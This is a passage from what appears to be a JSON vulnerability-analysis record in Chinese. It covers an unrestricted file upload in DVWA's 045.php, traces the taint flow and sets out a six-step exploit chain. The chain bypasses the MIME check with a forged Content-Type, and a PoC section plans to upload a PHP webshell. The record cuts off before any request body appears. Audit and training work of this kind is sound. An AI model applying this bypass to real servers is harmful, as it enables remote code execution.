		if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {", "source": "multipart/form-data 上传字段 uploaded 的文件名、Content-Type 与内容", "source_kind": "upload", "source_name": "uploaded", "tainted_expression": "$_FILES['uploaded']['name'] / $_FILES['uploaded']['type'] / $_FILES['uploaded']['tmp_name']", "sink": "move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path) 写入 Web 根目录下的 hackable/uploads/", "endpoint": "/045.php", "http_method": "POST", "exploit_chain": [{"step": 1, "location": "045.php:3", "description": "入口判断：只要 POST 中存在 Upload 字段即进入上传逻辑，无认证、无 CSRF token 校验", "data_state": "攻击者完全控制请求体"}, {"step": 2, "location": "045.php:5-6", "description": "拼接目标路径：DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/" 加上 basename(原始文件名)，basename 只去掉目录部分，保留扩展名", "data_state": "$target_path = <webroot>/hackable/uploads/shell.php"}, {"step": 3, "location": "045.php:9-11", "description": "从 $_FILES 读取文件名、MIME 类型、大小，三者均来自客户端 multipart 请求", "data_state": "$uploaded_type 由请求头 Content-Type 决定"}, {"step": 4, "location": "045.php:14-15", "description": "校验条件：$uploaded_type 等于 image/jpeg 或 image/png 且 size<100000。由于 type 来自客户端，可任意伪造；size 也可伪造", "data_state": "伪造 Content-Type: image/jpeg 即通过校验", "bypass_reason": "MIME 类型取自客户端提交的 Content-Type，未使用 getimagesize()/finfo_file() 校验真实内容；扩展名未做白名单"}, {"step": 5, "location": "045.php:18", "description": "move_uploaded_file 把临时文件移动到 Web 可访问目录，文件名与扩展名由攻击者指定", "data_state": "任意 PHP 代码落盘为 .php 文件"}, {"step": 6, "location": "045.php:24", "description": "成功分支回显目标路径，攻击者据此得知上传后的 URL，可直接请求执行"}], "poc": {"description": "伪造 Content-Type 上传 PHP webshell 到 uploads 目录，再访问该文件执行命令", "preconditions": ["045.php 可通过 Web 访问且 DVWA_WEB_PAGE_TO_ROOT 指向 Web 根目录", "hackable/uploads/ 目录存在且可写（DVWA 默认配置）", "uploads 目录未禁止 PHP 解析"], "steps": [{"step": 1, "action": "上传伪装成 JPEG 的 PHP 文件", "request": "POST /045.php HTTP/1.1
